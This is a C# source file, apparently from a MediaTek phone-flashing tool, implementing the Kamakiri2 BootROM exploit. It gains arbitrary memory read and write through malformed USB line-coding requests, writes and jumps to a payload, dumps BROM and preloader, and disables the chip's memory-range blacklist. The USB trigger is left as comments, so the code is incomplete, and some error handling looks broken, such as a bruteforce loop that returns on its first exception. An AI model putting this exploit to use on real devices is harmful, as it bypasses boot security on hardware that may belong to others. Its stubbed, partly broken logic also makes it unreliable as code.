using System;
using System.Threading.Tasks;
using LibUsbDotNet;
using LibUsbDotNet.Main;
using tools.Modules.MTK.Protocol;
using tools.Modules.MTK.Models;

namespace tools.Modules.MTK.Exploit
{
    /// <summary>
    /// Kamakiri2 漏洞利用
    /// 原理: 通过 brom_register_access 命令结合 USB 控制传输实现任意内存读写
    /// 影响: MT6761, MT6765, MT6768, MT6771, MT6785, MT6833, MT6853, MT6873, MT6877, MT6885, MT6893 等
    /// </summary>
    public class Kamakiri2 : ExploitBase
    {
        private UsbDevice? _device;
        private byte[]? _linecode;

        // BROM Register Access 相关地址
        private uint _ptrDa;

        public Kamakiri2(PreloaderProtocol preloader, ChipConfig chipConfig, UsbDevice? device = null)
            : base(preloader, chipConfig)
        {
            _device = device;
        }

        /// <summary>
        /// Kamakiri2 核心漏洞触发
        /// 通过 USB SET_LINE_CODING 请求触发内存覆盖
        /// 注意: 需要底层 USB 访问支持
        /// </summary>
        private void TriggerKamakiri2(uint addr)
        {
            if (_device == null) return;

            try
            {
                // 获取当前 Line Coding
                if (_linecode == null)
                {
                    _linecode = new byte[8];
                    // 需要 USB 控制传输: GET_LINE_CODING (0xA1, 0x21)
                    // 此处需要实际 USB 设备实现
                }

                // 构造恶意 Line Coding (附加目标地址)
                byte[] malicious = new byte[_linecode.Length + 4];
                Array.Copy(_linecode, malicious, _linecode.Length);
                BitConverter.GetBytes(addr).CopyTo(malicious, _linecode.Length);

                // 需要发送 USB 控制传输:
                // SET_LINE_CODING (0x21, 0x20) with malicious data
                // GET_DESCRIPTOR (0x80, 0x6, 0x02FF) to trigger
            }
            catch
            {
                // 忽略异常
            }
        }

        /// <summary>
        /// 通过漏洞读写任意内存
        /// </summary>
        public byte[] DaReadWrite(uint address, uint length, byte[]? data = null)
        {
            // 初始化 brom_register_access
            try
            {
                Preloader.BromRegisterAccess(0, 1);
                Preloader.Read32(ChipConfig.Watchdog + 0x50);
            }
            catch { }

            // 获取 ptr_da 地址
            if (_ptrDa == 0)
            {
                if (ChipConfig.BromRegisterAccess != null && ChipConfig.BromRegisterAccess.Count > 0)
                {
                    _ptrDa = ChipConfig.BromRegisterAccess[0].Item2;
                }
                else
                {
                    throw new Exception("Unknown CPU config - no brom_register_access address");
                }
            }

            // 触发漏洞 (设置高位地址)
            for (int i = 0; i < 3; i++)
            {
                TriggerKamakiri2(_ptrDa + 8 - 3 + (uint)i);
            }

            if (address < 0x40)
            {
                // 低地址范围
                for (int i = 0; i < 4; i++)
                {
                    TriggerKamakiri2(_ptrDa - 6 + (uint)(4 - i));
                }
                return Preloader.BromRegisterAccess(address, (int)length, data);
            }
            else
            {
                // 高地址范围
                for (int i = 0; i < 3; i++)
                {
                    TriggerKamakiri2(_ptrDa - 5 + (uint)(3 - i));
                }
                return Preloader.BromRegisterAccess(address - 0x40, (int)length, data);
            }
        }

        /// <summary>
        /// 读取内存
        /// </summary>
        public byte[] DaRead(uint address, uint length)
        {
            return DaReadWrite(address, length, null);
        }

        /// <summary>
        /// 写入内存
        /// </summary>
        public void DaWrite(uint address, byte[] data)
        {
            DaReadWrite(address, (uint)data.Length, data);
        }

        /// <summary>
        /// 执行漏洞利用
        /// </summary>
        public override bool Exploit(byte[] payload, uint payloadAddr)
        {
            try
            {
                Log($"Starting Kamakiri2 exploit, payload addr: 0x{payloadAddr:X}");

                // 获取 Line Coding (需要 USB 设备支持)
                if (_linecode == null && _device != null)
                {
                    _linecode = new byte[8];
                    // 需要 USB 控制传输: GET_LINE_CODING (0xA1, 0x21)
                }

                // 读取 send_ptr 地址
                uint sendPtr = 0;
                if (ChipConfig.SendPtr != null && ChipConfig.SendPtr.Count > 0)
                {
                    var sendPtrData = DaRead(ChipConfig.SendPtr[0].Item2, 4);
                    sendPtr = BitConverter.ToUInt32(sendPtrData, 0) + 8;
                }
                else
                {
                    throw new Exception("No send_ptr configuration");
                }

                // 写入 Payload
                Log($"Writing payload ({payload.Length} bytes) to 0x{payloadAddr:X}...");
                DaWrite(payloadAddr, payload);

                // 写入跳转地址 (不检查结果)
                Log($"Writing jump address to 0x{sendPtr:X}...");
                try
                {
                    DaReadWrite(sendPtr, 4, BitConverter.GetBytes(payloadAddr));
                }
                catch
                {
                    // 忽略异常
                }

                Log("Kamakiri2 exploit completed");
                return true;
            }
            catch (Exception ex)
            {
                Log($"Kamakiri2 exploit failed: {ex.Message}");
                return false;
            }
        }

        /// <summary>
        /// 运行 Payload
        /// </summary>
        public override async Task<bool> RunPayloadAsync(byte[] payload, uint? addr = null)
        {
            uint payloadAddr = addr ?? ChipConfig.BromPayloadAddr;
            byte[] fixedPayload = FixPayload(payload, false);

            Log($"Running payload at 0x{payloadAddr:X}...");

            if (Exploit(fixedPayload, payloadAddr))
            {
                await Task.Delay(200);

                // 等待确认
                try
                {
                    var ack = Preloader.ReadDword();
                    if (ack == 0xA1A2A3A4)
                    {
                        Log("Payload executed successfully");
                        return true;
                    }
                }
                catch { }
            }

            return false;
        }

        /// <summary>
        /// Dump BROM (通过内存读取)
        /// </summary>
        public override async Task<byte[]?> DumpBromAsync(uint length = 0x20000)
        {
            try
            {
                Log($"Dumping BROM via Kamakiri2, length: 0x{length:X}...");

                byte[] brom = new byte[length];
                const uint chunkSize = 0x40;

                for (uint addr = 0; addr < length; addr += chunkSize)
                {
                    uint toRead = Math.Min(chunkSize, length - addr);
                    var chunk = DaRead(addr, toRead);
                    Array.Copy(chunk, 0, brom, addr, chunk.Length);

                    if (addr % 0x1000 == 0)
                    {
                        int progress = (int)(addr * 100 / length);
                        Log($"Progress: {progress}%, addr: 0x{addr:X}");
                    }
                }

                Log("BROM dump completed");
                return brom;
            }
            catch (Exception ex)
            {
                Log($"BROM dump failed: {ex.Message}");
                return null;
            }
        }

        /// <summary>
        /// Dump BROM (暴力搜索模式)
        /// </summary>
        public async Task<byte[]?> DumpBromBruteforceAsync(uint dumpPtr)
        {
            try
            {
                Log($"Dumping BROM via bruteforce at ptr: 0x{dumpPtr:X}...");

                // 初始化
                try
                {
                    Preloader.BromRegisterAccess(0, 1);
                    Preloader.Read32(ChipConfig.Watchdog + 0x50);
                }
                catch { }

                // 触发漏洞
                for (int i = 0; i < 4; i++)
                {
                    TriggerKamakiri2(dumpPtr - 6 + (uint)(4 - i));
                }

                // 读取 BROM
                byte[] brom = Preloader.BromRegisterAccess(0, 0x20000);

                // 修复 dump_ptr 位置的数据
                int ptrIndex = (int)dumpPtr - 1;
                if (ptrIndex >= 0 && ptrIndex < brom.Length - 5)
                {
                    brom[ptrIndex] = 0;
                    BitConverter.GetBytes((uint)0x100030).CopyTo(brom, ptrIndex + 1);
                }

                Log("BROM bruteforce dump completed");
                return brom;
            }
            catch (Exception ex)
            {
                Log($"BROM bruteforce dump failed: {ex.Message}");
                return null;
            }
        }

        /// <summary>
        /// Dump Preloader
        /// </summary>
        public override async Task<byte[]?> DumpPreloaderAsync()
        {
            try
            {
                Log("Dumping Preloader via Kamakiri2...");

                // 读取长度
                var lenBytes = Preloader.ReadBytes(4);
                uint length = BitConverter.ToUInt32(lenBytes, 0);

                if (length == 0)
                {
                    Log("Preloader length is 0");
                    return null;
                }

                // 读取数据
                var data = Preloader.ReadBytes((int)length);

                // 查找文件名
                int idx = FindPattern(data, System.Text.Encoding.ASCII.GetBytes("MTK_BLOADER_INFO"));
                if (idx != -1)
                {
                    string filename = System.Text.Encoding.ASCII.GetString(data, idx + 0x1B, 0x30).TrimEnd('\0');
                    Log($"Found preloader: {filename}");
                }

                Log("Preloader dump completed");
                return data;
            }
            catch (Exception ex)
            {
                Log($"Preloader dump failed: {ex.Message}");
                return null;
            }
        }

        /// <summary>
        /// 禁用内存黑名单
        /// </summary>
        public override bool DisableRangeBlacklist()
        {
            try
            {
                Log("Disabling range blacklist via Kamakiri2...");

                if (ChipConfig.Blacklist == null || ChipConfig.Blacklist.Count == 0)
                {
                    Log("No blacklist configuration");
                    return true;
                }

                foreach (var blAddr in ChipConfig.Blacklist)
                {
                    DaWrite(blAddr + 0x8, new byte[4]);
                    DaWrite(blAddr + 0xC, new byte[4]);
                }

                Log("Blacklist disabled");
                return true;
            }
            catch (Exception ex)
            {
                Log($"Failed to disable blacklist: {ex.Message}");
                return false;
            }
        }

        /// <summary>
        /// 暴力搜索 BROM Register Access 地址
        /// </summary>
        public async Task<uint?> BruteforceAddressAsync(uint startAddr = 0x9900)
        {
            Log($"Starting address bruteforce from 0x{startAddr:X}...");

            try
            {
                Preloader.BromRegisterAccess(0, 1);
                Preloader.Read32(ChipConfig.Watchdog + 0x50);
            }
            catch { }

            for (uint addr = startAddr; addr <= 0xFFFF; addr += 4)
            {
                if (addr % 0x100 == 0)
                {
                    Log($"Testing address: 0x{addr:X}...");
                }

                try
                {
                    for (int i = 0; i < 3; i++)
                    {
                        TriggerKamakiri2(addr - 5 + (uint)(3 - i));
                    }

                    var result = Preloader.BromRegisterAccess(0, 0x40);
                    if (result != null && result.Length == 0x40)
                    {
                        Log($"Found valid address: 0x{addr:X}");
                        return addr;
                    }
                }
                catch
                {
                    // 如果出错，返回下一个地址继续
                    return addr + 4;
                }
            }

            Log("Bruteforce failed");
            return null;
        }

        private static int FindPattern(byte[] data, byte[] pattern)
        {
            for (int i = 0; i <= data.Length - pattern.Length; i++)
            {
                bool found = true;
                for (int j = 0; j < pattern.Length; j++)
                {
                    if (data[i + j] != pattern[j])
                    {
                        found = false;
                        break;
                    }
                }
                if (found) return i;
            }
            return -1;
        }
    }
}
